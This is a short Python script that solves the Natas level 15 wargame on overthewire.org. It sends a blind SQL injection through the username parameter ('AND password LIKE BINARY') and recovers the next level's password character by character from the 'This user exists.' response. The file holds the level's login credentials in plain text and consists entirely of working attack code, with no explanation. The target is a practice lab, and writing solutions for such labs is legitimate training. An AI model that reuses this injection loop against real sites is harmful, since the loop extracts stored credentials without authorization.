import string
import requests

characters = "abcdefghijklmnopqrstuvwxyzZYXWVUTSRQPONMLKJIHGFEDCBA1234567890"
url = "http://natas15.natas.labs.overthewire.org/"
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
password = ""
passlength = 32
exists_str = "This user exists."

while len(password) != 32:
    for char in characters:
        uri = url+'?username=natas16"+'+'AND+password+LIKE+BINARY+"'+'{}{}%'.format(password,char)
        print(uri)

        r = requests.get(uri, auth=(auth_username, auth_password))
        if exists_str in r.text:
            password = password + char
            print("Password: {0}".format(password))